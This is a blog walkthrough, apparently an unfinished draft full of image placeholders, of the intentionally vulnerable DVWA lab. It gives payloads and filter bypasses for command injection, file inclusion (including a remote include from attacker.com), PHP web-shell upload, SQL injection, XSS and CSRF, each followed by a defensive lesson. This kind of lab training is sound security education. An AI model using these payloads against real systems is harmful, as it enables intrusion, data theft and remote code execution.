---
title: "Damn Vulnerable Web Application (DVWA) — Complete Walkthrough"
date: 2026-09-22 09:00:00 +0000
categories: [Damn Vulnerable Applications]
tags: [DVWA, Web Security, SQL Injection, XSS, LFI, Command Injection, Docker]
description: "A module-by-module walkthrough of DVWA across low, medium and high security levels: brute force, command injection, CSRF, file inclusion/upload, SQLi, XSS and more."
author: Paschal Sangawe
toc: true
---

**Damn Vulnerable Web Application (DVWA)** is one of the classic deliberately-vulnerable PHP/MySQL apps. Its value is the three **security levels** (low / medium / high) — the same bug appears with progressively stronger (and progressively flawed) defences, which makes it an excellent way to learn how real-world mitigations fail.

This post is my module-by-module walkthrough with the payloads and the bypass for each level.

> **Authorisation:** DVWA is intentionally vulnerable and designed to be run locally. Everything below was tested on my own instance.

{% raw %}

## Setup

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
# then browse to http://localhost/setup.php and click "Create / Reset Database"
```

Default login: **admin / password**. Set the level under **DVWA Security** (stored in the `security` cookie). Reset the DB between modules.

## 1. Brute Force
> **Picture goes here (#1).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `POST /vulnerabilities/brute/`.
> _Save as_ `images/dvwa-walkthrough/1.png` _then replace this block with_ `![1. Brute Force](/images/dvwa-walkthrough/1.png)`_._


The login form has no real rate limiting at low/medium.

- **Low:** intercept `POST /vulnerabilities/brute/` and run Burp Intruder over `password` with `admin` fixed (wordlist: `rockyou`/`10-million-password-list`).
- **Medium:** the app sleeps on failure and mis-handles the first failed attempt; still brute-forceable with a slower Intruder, and usernames can be enumerated by response timing.
- **High:** a CSRF `user_token` plus a random sleep and a lockout after 3 failures. Automate by extracting `user_token` per request and pausing between attempts; tools like `ffuf` with a token-extraction preprocessor or a custom script handle this.

> **Picture goes here (#2).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/2.png` _then replace this block with_ `![1. Brute Force](/images/dvwa-walkthrough/2.png)`_._

## 2. Command Injection
> **Picture goes here (#3).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# Low — any separator works`.
> _Save as_ `images/dvwa-walkthrough/3.png` _then replace this block with_ `![2. Command Injection](/images/dvwa-walkthrough/3.png)`_._


Enter a ping target — the input is passed to the shell.

```text
# Low — any separator works
127.0.0.1; whoami
127.0.0.1 && id
127.0.0.1 | cat /etc/passwd
```

> **Picture goes here (#4).** Capture this request/response or command step in Burp/terminal. Key line: `127.0.0.1; whoami`.
> _Save as_ `images/dvwa-walkthrough/4.png` _then replace this block with_ `![2. Command Injection](/images/dvwa-walkthrough/4.png)`_._


- **Medium:** `&&` and `;` are stripped, but a pipe survives:

```text
127.0.0.1 | whoami
```

> **Picture goes here (#5).** Capture this request/response or command step in Burp/terminal. Key line: `127.0.0.1 | whoami`.
> _Save as_ `images/dvwa-walkthrough/5.png` _then replace this block with_ `![2. Command Injection](/images/dvwa-walkthrough/5.png)`_._


- **High:** a longer substitution list removes `| `, `&`, `;`, `-`, `$`, `(`, `)`, backticks and `||`. A pipe **without** a trailing space still works:

```text
127.0.0.1|whoami
```

> **Picture goes here (#6).** Capture this request/response or command step in Burp/terminal. Key line: `127.0.0.1|whoami`.
> _Save as_ `images/dvwa-walkthrough/6.png` _then replace this block with_ `![2. Command Injection](/images/dvwa-walkthrough/6.png)`_._


**Lesson:** blocklists lose. Validate the input as a real IP/hostname and never invoke a shell.

> **Picture goes here (#7).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/7.png` _then replace this block with_ `![2. Command Injection](/images/dvwa-walkthrough/7.png)`_._

## 3. CSRF
> **Picture goes here (#8).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<img src="http://localhost/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&`.
> _Save as_ `images/dvwa-walkthrough/8.png` _then replace this block with_ `![3. CSRF](/images/dvwa-walkthrough/8.png)`_._


The password-change form can be triggered cross-site.

- **Low:** no token, GET request:

```html
<img src="http://localhost/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
```

> **Picture goes here (#9).** Capture this step in the decompiler/editor or terminal. Key line: `<img src="http://localhost/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&`.
> _Save as_ `images/dvwa-walkthrough/9.png` _then replace this block with_ `![3. CSRF](/images/dvwa-walkthrough/9.png)`_._


- **Medium:** checks that `HTTP_REFERER` contains the server name. Bypass by hosting the exploit at a path that includes the victim host (e.g. `http://attacker.com/localhost/csrf.html`) or by using the stored XSS.
- **High:** adds a per-request `user_token`; chain it with a stored-XSS payload that reads the token and submits the form.

**Lesson:** use a per-request, session-bound CSRF token; Referer checks are bypassable.

> **Picture goes here (#10).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/10.png` _then replace this block with_ `![3. CSRF](/images/dvwa-walkthrough/10.png)`_._

## 4. File Inclusion (LFI / RFI)
> **Picture goes here (#11).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# Low — LFI`.
> _Save as_ `images/dvwa-walkthrough/11.png` _then replace this block with_ `![4. File Inclusion (LFI / RFI)](/images/dvwa-walkthrough/11.png)`_._


```text
# Low — LFI
?page=../../../../../../etc/passwd
# Low — RFI (needs allow_url_include=On)
?page=http://attacker.com/shell.txt
```

> **Picture goes here (#12).** Capture this request/response or command step in Burp/terminal. Key line: `?page=../../../../../../etc/passwd`.
> _Save as_ `images/dvwa-walkthrough/12.png` _then replace this block with_ `![4. File Inclusion (LFI / RFI)](/images/dvwa-walkthrough/12.png)`_._


- **Medium:** filters `http://`, `https://`, `../`, `..\`. Bypass the traversal with nested sequences:

```text
?page=....//....//....//....//etc/passwd
```

> **Picture goes here (#13).** Capture this request/response or command step in Burp/terminal. Key line: `?page=....//....//....//....//etc/passwd`.
> _Save as_ `images/dvwa-walkthrough/13.png` _then replace this block with_ `![4. File Inclusion (LFI / RFI)](/images/dvwa-walkthrough/13.png)`_._


- **High:** requires the value to start with `file` and rejects anything else:

```text
?page=file:///etc/passwd
```

> **Picture goes here (#14).** Capture this request/response or command step in Burp/terminal. Key line: `?page=file:///etc/passwd`.
> _Save as_ `images/dvwa-walkthrough/14.png` _then replace this block with_ `![4. File Inclusion (LFI / RFI)](/images/dvwa-walkthrough/14.png)`_._


**Lesson:** don't build file paths from user input; use an allow-list of pages, and disable `allow_url_include`/`allow_url_fopen`.

> **Picture goes here (#15).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/15.png` _then replace this block with_ `![4. File Inclusion (LFI / RFI)](/images/dvwa-walkthrough/15.png)`_._

## 5. File Upload
> **Picture goes here (#16).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<?php system($_GET['cmd']); ?>`.
> _Save as_ `images/dvwa-walkthrough/16.png` _then replace this block with_ `![5. File Upload](/images/dvwa-walkthrough/16.png)`_._


- **Low:** upload a PHP shell; it lands in `/hackable/uploads/`:

```php
<?php system($_GET['cmd']); ?>
```

> **Picture goes here (#17).** Capture this step in the decompiler/editor or terminal. Key line: `<?php system($_GET['cmd']); ?>`.
> _Save as_ `images/dvwa-walkthrough/17.png` _then replace this block with_ `![5. File Upload](/images/dvwa-walkthrough/17.png)`_._


Request `http://localhost/hackable/uploads/shell.php?cmd=id`.

- **Medium:** validates MIME type (`image/jpeg`/`image/png`) and size. Bypass by changing the part's `Content-Type` to `image/jpeg` while keeping the `.php` filename/body.
- **High:** requires a `jpg/jpeg/png` extension **and** a valid image (`getimagesize()`). Direct execution is blocked; the usual route is to combine it with the file-inclusion bug, or use a polyglot image containing PHP and include it.

**Lesson:** validate content, re-encode images, generate safe filenames, and disable script execution in upload directories.

> **Picture goes here (#18).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/18.png` _then replace this block with_ `![5. File Upload](/images/dvwa-walkthrough/18.png)`_._

## 6. SQL Injection
> **Picture goes here (#19).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# Low`.
> _Save as_ `images/dvwa-walkthrough/19.png` _then replace this block with_ `![6. SQL Injection](/images/dvwa-walkthrough/19.png)`_._


```text
# Low
1' OR '1'='1
1' UNION SELECT user, password FROM users -- -
```

> **Picture goes here (#20).** Capture this request/response or command step in Burp/terminal. Key line: `1' OR '1'='1`.
> _Save as_ `images/dvwa-walkthrough/20.png` _then replace this block with_ `![6. SQL Injection](/images/dvwa-walkthrough/20.png)`_._


Dump everything with sqlmap: `sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="..." --dbs`.

- **Medium:** quotes are escaped and the form uses POST, but `id` is numeric so no quotes are needed:

```text
1 UNION SELECT user, password FROM users #
```

> **Picture goes here (#21).** Capture this request/response or command step in Burp/terminal. Key line: `1 UNION SELECT user, password FROM users #`.
> _Save as_ `images/dvwa-walkthrough/21.png` _then replace this block with_ `![6. SQL Injection](/images/dvwa-walkthrough/21.png)`_._


- **High:** quotes are escaped and the query appends `LIMIT 1`, which blocks simple `UNION`. Boolean/time-based blind still works:

```text
1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE user='admin')='a' -- -
```

> **Picture goes here (#22).** Capture this request/response or command step in Burp/terminal. Key line: `1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE user='admin')='a' -- -`.
> _Save as_ `images/dvwa-walkthrough/22.png` _then replace this block with_ `![6. SQL Injection](/images/dvwa-walkthrough/22.png)`_._


**Lesson:** use prepared statements with bound parameters — escaping plus `LIMIT` is not a fix.

> **Picture goes here (#23).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/23.png` _then replace this block with_ `![6. SQL Injection](/images/dvwa-walkthrough/23.png)`_._

## 7. SQL Injection (Blind)
> **Picture goes here (#24).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `1' AND '1'='1`.
> _Save as_ `images/dvwa-walkthrough/24.png` _then replace this block with_ `![7. SQL Injection (Blind)](/images/dvwa-walkthrough/24.png)`_._


- **Low:** `1' AND '1'='1` returns a row, `1' AND '1'='2` does not.
- **Medium:** numeric context, no quotes: `1 AND 1=1`.
- **High:** `1' AND '1'='1' -- `.

Automate character extraction with Burp Intruder (two positions: offset + character) or `sqlmap --technique=B`.

> **Picture goes here (#25).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/25.png` _then replace this block with_ `![7. SQL Injection (Blind)](/images/dvwa-walkthrough/25.png)`_._

## 8. Weak Session IDs
> **Picture goes here (#26).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `dvwaSession`.
> _Save as_ `images/dvwa-walkthrough/26.png` _then replace this block with_ `![8. Weak Session IDs](/images/dvwa-walkthrough/26.png)`_._


DVWA generates the `dvwaSession` cookie insecurely:

- **Low:** a simple increment (`1`, `2`, `3` …) — trivially predictable.
- **Medium:** a Unix timestamp — guessable within a window.
- **High:** `md5(time())` — predictable if you know the approximate time.

**Lesson:** session IDs must come from a CSPRNG, not counters, timestamps or hashes of them.

> **Picture goes here (#27).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/27.png` _then replace this block with_ `![8. Weak Session IDs](/images/dvwa-walkthrough/27.png)`_._

## 9. XSS (DOM-Based)
> **Picture goes here (#28).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# Low`.
> _Save as_ `images/dvwa-walkthrough/28.png` _then replace this block with_ `![9. XSS (DOM-Based)](/images/dvwa-walkthrough/28.png)`_._


The language selector writes the `default` value into the DOM.

```text
# Low
?default=<script>alert(1)</script>

# Medium — <script is stripped; use an event handler
?default=<img src=x onerror=alert(1)>
```

> **Picture goes here (#29).** Capture this request/response or command step in Burp/terminal. Key line: `?default=<script>alert(1)</script>`.
> _Save as_ `images/dvwa-walkthrough/29.png` _then replace this block with_ `![9. XSS (DOM-Based)](/images/dvwa-walkthrough/29.png)`_._


- **High:** the value is checked against an allow-list of known languages → not exploitable via the parameter.

**Lesson:** never write untrusted data with `innerHTML`/`document.write`; use `textContent`.

> **Picture goes here (#30).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/30.png` _then replace this block with_ `![9. XSS (DOM-Based)](/images/dvwa-walkthrough/30.png)`_._

## 10. XSS (Reflected)
> **Picture goes here (#31).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `# Low`.
> _Save as_ `images/dvwa-walkthrough/31.png` _then replace this block with_ `![10. XSS (Reflected)](/images/dvwa-walkthrough/31.png)`_._


```text
# Low
?name=<script>alert(1)</script>

# Medium — <script is removed; nested/alternate payloads work
?name=<scr<script>ipt>alert(1)</script>
?name=<img src=x onerror=alert(1)>
```

> **Picture goes here (#32).** Capture this request/response or command step in Burp/terminal. Key line: `?name=<script>alert(1)</script>`.
> _Save as_ `images/dvwa-walkthrough/32.png` _then replace this block with_ `![10. XSS (Reflected)](/images/dvwa-walkthrough/32.png)`_._


- **High:** output is passed through `htmlspecialchars()` → not exploitable (pivot to DOM XSS).

> **Picture goes here (#33).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/33.png` _then replace this block with_ `![10. XSS (Reflected)](/images/dvwa-walkthrough/33.png)`_._

## 11. XSS (Stored)
> **Picture goes here (#34).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<script>alert(1)</script>`.
> _Save as_ `images/dvwa-walkthrough/34.png` _then replace this block with_ `![11. XSS (Stored)](/images/dvwa-walkthrough/34.png)`_._


- **Low:** message/name field `<script>alert(1)</script>` — fires for every visitor.
- **Medium:** `<script` is stripped; use `<img src=x onerror=alert(1)>`.
- **High:** `htmlspecialchars()` on output → not exploitable.

**Lesson:** context-aware output encoding on the server, plus a Content-Security-Policy, is the durable fix.

> **Picture goes here (#35).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/35.png` _then replace this block with_ `![11. XSS (Stored)](/images/dvwa-walkthrough/35.png)`_._

## 12. CSP Bypass
> **Picture goes here (#36).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `<script src=...>`.
> _Save as_ `images/dvwa-walkthrough/36.png` _then replace this block with_ `![12. CSP Bypass](/images/dvwa-walkthrough/36.png)`_._


- **Low:** the CSP allows scripts from a whitelisted third party; host your JS there and load it with `<script src=...>`.
- **Medium:** a nonce is used; abuse a self-hosted file (e.g. an uploaded `.js` under `/hackable/uploads/`) with `<script src="/hackable/uploads/x.js">`.
- **High:** stricter nonce handling.

**Lesson:** a CSP is only as strong as its allow-list; avoid `unsafe-inline` and self-hosted upload paths in `script-src`.

> **Picture goes here (#37).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/37.png` _then replace this block with_ `![12. CSP Bypass](/images/dvwa-walkthrough/37.png)`_._

## 13. Other modules
> **Picture goes here (#38).** Capture a Burp request (or terminal command) for this lab, showing the payload you send. Key payload: `?redirect=http://evil.com`.
> _Save as_ `images/dvwa-walkthrough/38.png` _then replace this block with_ `![13. Other modules](/images/dvwa-walkthrough/38.png)`_._


- **Open HTTP Redirect:** `?redirect=http://evil.com` — validate redirect targets against an allow-list.
- **Insecure CAPTCHA:** low/medium CAPTCHA is bypassable by tampering with the `step`/`passed` parameters; high uses reCAPTCHA.
- **Authorisation Bypass:** change `user_id`/`id` parameters on `/vulnerabilities/authbypass/` to read or modify other users — enforce object-level authorization.
- **Cryptography:** weak MD5 hashing; crack with `hashcat -m 0`.
- **PHP Info / API:** information disclosure and an intentionally weak API module.

## Cross-cutting lessons

1. **Blocklists fail.** Every "medium/high" filter here is a substitution list; nested sequences, alternate separators and event handlers defeat them.
2. **Escaping is not parameterisation.** SQL needs prepared statements; shell needs argv execution.
3. **Client-side trust is no trust.** DOM XSS and CSP bypass both stem from trusting client input.
4. **Object-level authorization is mandatory.** Authorisation Bypass is a pure IDOR.
5. **Secrets and IDs need entropy.** Weak session IDs are the archetype.

## Related posts

- [Damn Vulnerable GraphQL Application (DVGA)](/posts/dvga-walkthrough/)
- [OWASP crAPI](/posts/crapi-walkthrough/)
- [PortSwigger SQL Injection labs](/posts/portswigger-sqli-part-1-basics/)
- [PortSwigger File Upload labs](/posts/portswigger-file-upload-labs/)

{% endraw %}

> **Picture goes here (#39).** Capture the response/output that proves this works (Burp response, terminal output, or browser result).
> _Save as_ `images/dvwa-walkthrough/39.png` _then replace this block with_ `![Related posts](/images/dvwa-walkthrough/39.png)`_._
